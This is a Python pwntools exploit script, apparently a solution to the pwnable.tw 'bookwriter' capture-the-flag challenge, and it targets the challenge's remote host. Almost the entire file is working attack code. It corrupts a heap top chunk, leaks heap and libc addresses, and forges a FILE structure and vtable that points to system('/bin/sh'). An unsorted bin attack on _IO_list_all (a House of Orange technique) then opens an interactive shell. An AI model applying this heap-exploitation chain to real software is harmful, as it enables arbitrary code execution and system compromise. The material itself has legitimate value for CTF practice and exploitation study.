#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal

from pwn import *

#context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./bookwriter")
elf = ELF(pwn_file, checksec=False)

if len(sys.argv) == 1:
    r = process(pwn_file)
    libc = elf.libc
else:
    r = remote("chall.pwnable.tw", 10304)
    libc = ELF("./libc_64.so.6")

def debug():
    gdb.attach(r, "b *0x400CE9")

def add(size, data):
    r.sendafter(":", '1')
    r.sendafter(":", str(size))
    r.sendafter(":", data)

def view(idx):
    r.sendafter(":", '2')
    r.sendafter(":", str(idx))

def edit(idx, data):
    r.sendafter(":", '3')
    r.sendafter(":", str(idx))
    r.sendafter(":", data)

def name(data):
    r.sendafter("Author :", data)

def leak():
    r.sendafter(":", '4')
    r.recvuntil('a'*0x40)
    heap = u64(r.recvline().strip().ljust(8, "\x00")) - 0x10
    r.sendlineafter(") ", '0')
    return heap

# Modify top chunk size to get an unsorted bin.
# Leak heap and libc address,
name('a'*0x40)
add(0x18, 'a'*0x18)
edit(0, 'a')
edit(0, '\x00'*0x18+p16(0xfe1)+'\x00')
heap = leak()
add(0x1000, 'a'*0x100)

# Change size[0](==heap[8]) to achieve arbitrarily overflow.
for i in range(7):      
    add(0x50, 'a'*8)

view(3)
r.recvuntil("a"*8)
if len(sys.argv) == 1:
    a = u64(r.recvline().strip().ljust(8, '\x00')) - 0x3c4b78       # local
else:
    a = u64(r.recvline().strip().ljust(8, '\x00')) - 0x3c3b78       # remote

libc.address = a

print "heap addr: ", hex(heap)
print "libc addr: ", hex(a)

# Fake file struct and vtable.
vtable = heap + 0x2b0 + 0xd8 + 0x10 + 0x8

payload = '\x00'*0x2b0
fake = "/bin/sh\x00" + p64(0x61)
fake += p64(0) + p64(libc.sym['_IO_list_all']-0x10)
fake += p64(0) + p64(1)
fake = fake.ljust(0xd8, '\x00')
fake += p64(vtable)
payload += fake
payload += p64(0)*3 + p64(libc.sym['system'])

# Overflow first unsorted bin's data and achieve unsorted bin attack.
edit(0, payload)

# malloc(any) to trigger malloc_printerr
r.sendafter(":", '1')
r.sendafter(":", str(0x10))


r.interactive()
